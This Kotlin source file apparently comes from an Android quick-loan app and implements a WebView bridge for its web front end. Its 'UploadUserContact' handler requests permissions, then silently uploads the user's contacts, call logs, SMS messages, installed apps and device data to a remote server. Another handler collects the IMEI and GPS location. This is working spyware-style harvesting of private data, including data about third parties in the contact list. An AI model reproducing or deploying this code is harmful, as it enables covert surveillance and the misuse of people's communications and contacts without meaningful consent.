package com.vaynhanh.vaynhanh.parts

import android.Manifest
import android.app.Activity
import android.content.ActivityNotFoundException
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.databinding.DataBindingUtil
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.media.Image
import android.net.Uri
import android.os.Build
import android.os.SystemClock
import android.provider.MediaStore
import android.support.annotation.RequiresApi
import android.support.v4.app.ActivityCompat
import android.support.v4.content.FileProvider
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import android.view.View
import android.webkit.WebResourceError
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.widget.Toast
import club.rosaemperor.myeyesopen.http.HttpService
import club.rosaemperor.myeyesopen.http.RetrofitUtil
import com.google.gson.Gson
import com.google.gson.JsonObject
import com.vaynhanh.vaynhanh.MainActivity
import com.vaynhanh.vaynhanh.R
import com.vaynhanh.vaynhanh.app.VayNhanhApplication
import com.vaynhanh.vaynhanh.databinding.ActivityMainBinding
import com.vaynhanh.vaynhanh.http.beans.*
import com.vaynhanh.vaynhanh.utils.*
import com.vaynhanh.vaynhanh.utils.SharePrefenceHelper.Companion.mContext
import org.json.JSONException
import org.json.JSONObject
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.IOException
import java.net.URISyntaxException
import java.text.SimpleDateFormat
import java.util.*
import kotlin.collections.ArrayList

class WVWebViewClient constructor(webView: WebView,messageHandler: WVJBHandler? = null) : WVJBWebViewClient(webView,messageHandler) {
    var thread : Thread ?= null
    var gson:Gson = Gson()
    var imageGetMobile :String=""
    var imageType = ""
    var CAMERA_REQUEST_CODE=1110
    var READ_PHONE_CODE = 1112
    val DATA_PERMISSIONS = 1111
    var cameraList = ArrayList<String>()
    var ACTIVITYFOROMCLIENT = 10010
    var PHOTO_RESULT =10086
    var readPhoneCallBack : WVJBResponseCallback? = null
    var firstClickTime: Long = 0L
    var dataUpLoadResult = false
    var mCurrentPhotoPath: String = ""
    var dataUpLoadCallback :WVJBResponseCallback? = null
    var httpHelper : HttpService = RetrofitUtil.instance.help
    constructor(webView: WebView) : this(webView ,object :WVJBHandler{
        override fun request(data: Any?, callback: WVJBResponseCallback?) {
            callback!!.callback("Response for message from ObjC!")
        }
    })
    init {
        registerHandler("UploadUserContact",object: WVJBHandler{

            override fun request(data: Any?, callback: WVJBResponseCallback?) {
                var jsonObject = data as JSONObject
                SharePrefenceHelper.save("Token",""+jsonObject.get("token"))
                if(Build.VERSION.SDK_INT < Build.VERSION_CODES.M){
                    upLoadData()
                    dataUpLoadResult= true
                    callback!!.callback(dataUpLoadResult)
                }else{
                    if (ActivityCompat.checkSelfPermission(
                                    webView.context, android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED &&
                            ActivityCompat.checkSelfPermission(webView.context,Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED &&
                            ActivityCompat.checkSelfPermission(webView.context,  Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED &&
                            ActivityCompat.checkSelfPermission(webView.context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                        dataUpLoadCallback = callback
                        dataUpLoadResult= true
                        dataUpLoadCallback!!.callback(dataUpLoadResult)
                        upLoadData()

                    }else{
                        cameraList.clear()
                        cameraList.add(android.Manifest.permission.READ_CONTACTS)
                        cameraList.add(Manifest.permission.READ_CALL_LOG)
                        cameraList.add(Manifest.permission.READ_SMS)
                        cameraList.add(Manifest.permission.READ_PHONE_STATE)
                        (webView.context as Activity).requestPermissions(cameraList.toTypedArray(),DATA_PERMISSIONS)
                    }
                }


            }
        })


        registerHandler("getVersion", object : WVJBHandler {
            override fun request(data: Any?, callback: WVJBResponseCallback?) {
                try {
                    val packageInfo = webView.context.packageManager.getPackageInfo(webView.context.packageName, 0)
                    val jsonObject = JSONObject()
                    jsonObject.put("versionName", packageInfo.versionName)
                    if (Build.VERSION.SDK_INT<= 27) jsonObject.put("versionCode", packageInfo.versionCode)
                    if (Build.VERSION.SDK_INT>= 28) jsonObject.put("versionCode", packageInfo.longVersionCode)
                    jsonObject.put("buildCode", VayNhanhApplication.buildCode)
                    callback!!.callback(jsonObject.toString())
                } catch (e: Exception) {
                    Log.e("error", e.message)
                }
            }
        })
        registerHandler("postCanScroll",object : WVJBHandler{
            override fun request(data: Any?, callback: WVJBResponseCallback?) {
                val s = data as Boolean
                var binding= DataBindingUtil.findBinding<ActivityMainBinding>(webView)
                binding!!.swipeLayout.isEnabled = s
            }
        })
        registerHandler("postImg",object : WVJBHandler{
            @RequiresApi(Build.VERSION_CODES.M)
            override fun request(data: Any?, callback: WVJBResponseCallback?) {
                var jsonObject : JSONObject = data as JSONObject
                 imageType = jsonObject.getString("num")
                imageGetMobile = jsonObject.getString("mobile")
                if (ActivityCompat.checkSelfPermission(
                                webView.context, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(webView.context, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                   takePhoto()
                }else{
                    cameraList.add( android.Manifest.permission.READ_EXTERNAL_STORAGE)
                    cameraList.add(Manifest.permission.CAMERA)
                    (webView.context as Activity).requestPermissions(cameraList.toTypedArray(),CAMERA_REQUEST_CODE)
                }

            }
        })
        registerHandler("postDeviceInfo", object : WVJBHandler{
            override fun request(data: Any?, callback: WVJBResponseCallback?) {
                val jsonObject = JSONObject()
                if (ActivityCompat.checkSelfPermission(webView.context, android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                    postDeviceInfo(jsonObject)
                    callback!!.callback(jsonObject.toString())
                }else{
                    cameraList.clear()
                    cameraList.add(android.Manifest.permission.READ_PHONE_STATE)
                    if (Build.VERSION.SDK_INT >= 23 ){
                        (webView.context as Activity).requestPermissions(cameraList.toTypedArray(),READ_PHONE_CODE)
                        readPhoneCallBack = callback
                    }

                }
            }
        })

        registerHandler("backPress", object : WVJBHandler {
            override fun request(data: Any?, callback: WVJBResponseCallback?) {
                val s = ""
                val jsonObject = data as org.json.JSONObject
                jsonObject.toString()
                try {
                    val b = jsonObject.getBoolean("isRootPage")
                    if (b) {
                        if (System.currentTimeMillis() - firstClickTime < 2000) {
                            (webView.context as Activity).finish()
                        } else {
                            firstClickTime = System.currentTimeMillis()
                            Toast.makeText(webView.context, R.string.double_click_to_quit, Toast.LENGTH_SHORT).show()
                        }
                    } else {
                        webView.goBackOrForward(-1)
                    }
                } catch (e: JSONException) {
                    e.printStackTrace()
                }

            }
        })

    }

    override fun onPageFinished(view: WebView, url: String) {
        super.onPageFinished(view, url)
        var  binding = DataBindingUtil.findBinding<ActivityMainBinding>(view)
        if(binding!!.swipeLayout.isRefreshing) binding.swipeLayout.isRefreshing = false
        SplashScreen.hide(view.context as Activity?)
    }

    fun onActivityResult(intent : Intent?){
        var time = System.currentTimeMillis()
        val mImageBitmap= BitmapUtils.getFitSampleBitmap(mCurrentPhotoPath, 800, 800)

       var imageString= ""

//            Log.d("TAGS",""+mImageBitmap!!.byteCount)
        val options = BitmapFactory.Options()
        options.inSampleSize = 5
        val nBitmap = BitmapFactory.decodeFile(mCurrentPhotoPath, options)
            val baos = ByteArrayOutputStream()
        if(nBitmap == null) {
            upImageWithNoOCR(imageString)
            return
        }
        nBitmap.compress(Bitmap.CompressFormat.JPEG, 100, baos)
//        Log.d("TAGS","after:${nBitmap.byteCount}")
        var thread = Thread(Runnable {
            imageString = Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT)
            time = System.currentTimeMillis()-time
            Log.d("time","$time")
            upImageWithNoOCR(imageString)
        })
        thread.start()

    }

    private fun upImage(imageType: String, imageString: String?) {
        when (imageType) {
            IMAGE_TYPE_OCR_FRONT -> upLoadIDCard(imageString, 1)
            IMAGE_TYPE_OCR_BACK -> upLoadIDCard(imageString, 2)
            IMAGE_TYPE_LIVENESS -> upLoadIDCard(imageString, 3)
        }
    }
    fun upImageWithNoOCR(imageString: String?){
        if (imageString != null) {
            var callBackBean  = ImageCallBackBean()
            callBackBean.status ="success"
            callBackBean.message = "暂时没有使用OCR"
            callBackBean.data= imageString
            callBackBean.decodeData = "没有使用OCR"
            (webView.context as Activity).runOnUiThread {
                callHandler("getImg",gson.toJson(callBackBean))
            }

        }
    }

    /**
     *
     * ocr识别预留方法
     */
    private fun upLoadIDCard(imageString: String?, ocr_mode: Int) {
        var imageJson = ImageJson()
        var userInfo = JSONObject()
        userInfo.put("image_content",imageString)
        var options = JSONObject()
        options.put("ocr_type", 1)
        options.put("auto_rotate", true)
        options.put("ocr_mode", ocr_mode)
        imageJson.options = options.toString()
        imageJson.user_info = userInfo.toString()
        var call=httpHelper.upLoadFaceImage(imageJson)
        call.enqueue(object : Callback<Any>{
            override fun onFailure(call: Call<Any>, t: Throwable) {
                Log.d("TAG","onFailure")
            }

            override fun onResponse(call: Call<Any>, response: Response<Any>) {
                Log.d("TAG","onResponse"+response.body().toString()+response.errorBody())
            }
        })

    }

    fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        when(requestCode){
            CAMERA_REQUEST_CODE ->{
                if (grantResults[0]==0 && grantResults[1] ==0 ){
                    takePhoto()
                }
            }
            READ_PHONE_CODE -> {
                if(grantResults[0] == 0) postDeviceInfo(JSONObject())
            }
//            DATA_PERMISSIONS ->{
//
//            }

        }

    }


    val IMAGE_TYPE_OCR_FRONT = "one"
    val IMAGE_TYPE_OCR_BACK = "OCR_BACK"
    val IMAGE_TYPE_LIVENESS = "LIVENESS"
    fun upLoadData(){
        thread = Thread(Runnable {

            var judgeCall = RetrofitUtil.instance.help.judge()
            judgeCall.enqueue(object  : Callback<JudgeEntity>{
                override fun onFailure(call: Call<JudgeEntity>, t: Throwable) {

                }

                override fun onResponse(call: Call<JudgeEntity>, response: Response<JudgeEntity>) {
                    var entity = response.body()
                    entity?.let {
                        if (entity.expired)
                            upUserMessage()
                    }

                }
            })

        })
        thread!!.start()
    }
    fun upUserMessage(){
        var userMessages = UserMessages()
        //应用信息列表
        val applicationUtil = GetApplicationUtil()
        val appList = applicationUtil.getApplications(webView.context.packageManager)
        userMessages.appList = appList

        //通话记录列表
        GetCallRecordUtil.init(webView.context as Activity)
        val callRecords = GetCallRecordUtil.getCallRecordList(webView.context.contentResolver)
        userMessages.callRecord = callRecords

        //联系人列表

        val contactsUtil = GetContactsUtil(webView.context)
        userMessages.contact = contactsUtil.contacts

        //短信记录列表

        val smsRecordUtil = GetSmsRecordUtil(webView.context)
        userMessages.smsRecord = smsRecordUtil.smsInPhone
        //设备信息
        val device = DeviceModule(webView.context).deviceInfo
        userMessages.device = gson.fromJson<DeviceMessage>(device, DeviceMessage::class.java)
        var call = httpHelper.upLoadUserMessage(userMessages)
        call.enqueue(object : Callback<Any>{
            override fun onFailure(call: Call<Any>?, t: Throwable?) {
                Toast.makeText(webView.context,"Mạng bất thường, vui lòng nhấp lại",Toast.LENGTH_SHORT).show()
            }

            override fun onResponse(call: Call<Any>?, response: Response<Any>?) {


            }
        })
    }


    override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
        if (url.startsWith(WebView.SCHEME_TEL) || url.startsWith("sms:") || url.startsWith(WebView.SCHEME_MAILTO)) {
            try {
                val intent = Intent(Intent.ACTION_VIEW)
                intent.data = Uri.parse(url)
                webView.context.startActivity(intent)
            } catch (ignored: ActivityNotFoundException) {
            }

            return true
        } else if (url.startsWith("intent://")) {
            val intent: Intent
            try {
                intent = Intent.parseUri(url, Intent.URI_INTENT_SCHEME)
                intent.addCategory("android.intent.category.BROWSABLE")
                intent.component = null
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.ICE_CREAM_SANDWICH_MR1) {
                    intent.selector = null
                }
                val resolves = webView.context.packageManager.queryIntentActivities(intent, 0)
                if (resolves.size > 0) {
                    webView.context.startActivity(intent)
                }
                return true
            } catch (e: URISyntaxException) {
                e.printStackTrace()
            }

        }
        return super.shouldOverrideUrlLoading(view, url)
    }

    override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
        var url = view!!.url
        if (url.startsWith(WebView.SCHEME_TEL) || url.startsWith("sms:") || url.startsWith(WebView.SCHEME_MAILTO)) {
            try {
                val intent = Intent(Intent.ACTION_VIEW)
                intent.data = Uri.parse(url)
                webView.context.startActivity(intent)
            } catch (ignored: ActivityNotFoundException) {
            }

            return true
        } else if (url.startsWith("intent://")) {
            val intent: Intent
            try {
                intent = Intent.parseUri(url, Intent.URI_INTENT_SCHEME)
                intent.addCategory("android.intent.category.BROWSABLE")
                intent.component = null
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.ICE_CREAM_SANDWICH_MR1) {
                    intent.selector = null
                }
                val resolves = webView.context.packageManager.queryIntentActivities(intent, 0)
                if (resolves.size > 0) {
                    webView.context.startActivity(intent)
                }
                return true
            } catch (e: URISyntaxException) {
                e.printStackTrace()
            }

        }
        return super.shouldOverrideUrlLoading(view, request)
    }

    override fun onReceivedError(view: WebView, errorCode: Int, description: String, failingUrl: String) {
        networkError(webView)
    }

    override fun onReceivedError(view: WebView, request: WebResourceRequest, error: WebResourceError) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (request.url.toString() == webView.url)
                networkError(view)
        } else {
            networkError(view)
        }
    }

    private fun networkError(view: WebView) {
//        view.visibility = View.INVISIBLE
        var binding = DataBindingUtil.findBinding<ActivityMainBinding>(view)
//        binding!!.viewModel!!.webViewVisiable.set(View.GONE)
//        binding!!.viewModel!!.errorViewVisiable.set(View.VISIBLE)
        if (SplashScreen.b) {
            SplashScreen.b = false
            SplashScreen.hide(webView.context as Activity)
        }



    }
    fun postDeviceInfo(jsonObject: JSONObject){
        var tm = webView.context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

        var deviceID = if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.O_MR1) {
            tm.deviceId
        } else {
            tm.imei
        }
        var deviceVersion = Build.MODEL
        var systemVersion = Build.VERSION.RELEASE
        var deviceName = Build.HOST
        jsonObject.put("deviceOwner", deviceName)
        jsonObject.put("deviceBrand", deviceVersion)
        jsonObject.put("deviceImei", deviceID)
        jsonObject.put("osVer", systemVersion)
        var s = ChannelModule(webView.context).channel
        val ss = s.split(":".toRegex()).dropLastWhile { it.isEmpty() }.toTypedArray()
        if (ss.size == 2)
            s = ss[1]
        jsonObject.put("channelCode", s)

        val location = GetGeoUtil(webView.context as Activity).geo
        if (location != null) {
            jsonObject.put("geoLon", location.longitude)
            jsonObject.put("geoLat", location.latitude)
        }

        Log.e("devceInfo", jsonObject.toString())
    }


    @Throws(IOException::class)
    private fun createImageFile(): File {
        // Create an image file name
        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss").format(Date())
        val imageFileName = "JPEG_" + timeStamp + "_"
        val storageDir = (webView.context as MainActivity).filesDir
        val image = File.createTempFile(
                imageFileName, /* prefix */
                ".jpg", /* suffix */
                storageDir      /* directory */
        )

        // Save a file: path for use with ACTION_VIEW intents
        mCurrentPhotoPath = image.absolutePath

        return image
    }

     fun takePhoto() {
        // https://developer.android.com/training/camera/photobasics#TaskCaptureIntent

        val takePictureIntent = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
        // Ensure that there's a camera activity to handle the intent
        if (takePictureIntent.resolveActivity(webView.context.packageManager) != null) {
            // Create the File where the photo should go
            var photoFile: File? = null
            try {
                photoFile = createImageFile()
                if (!photoFile.getParentFile().exists()) {
                    photoFile.getParentFile().mkdir()
                }
            } catch (ex: IOException) {
                // Error occurred while creating the File
//                Toast.makeText(this@BrowserActivity, "get an exception while taking photo", Toast.LENGTH_SHORT).show()
                Log.e("file create error", "" + ex.toString())
            }

            // Continue only if the File was successfully created
            if (photoFile != null) {
                val photoURI: Uri
                if (Build.VERSION.SDK_INT >= 24) {
                    photoURI = FileProvider.getUriForFile(webView.context, "com.vaynhanh.vaynhanh.fileprovider", photoFile)
                } else {
                    photoURI = Uri.fromFile(photoFile)
                }
                takePictureIntent.putExtra(MediaStore.EXTRA_OUTPUT, photoURI)
                (webView.context as MainActivity).startActivityForResult(takePictureIntent, ACTIVITYFOROMCLIENT)
            }


        }
    }
    fun requestCancel(requestCode: Int,intent : Intent?){
        when(requestCode){
            ACTIVITYFOROMCLIENT->{
                upImageWithNoOCR("")
            }
        }

    }

}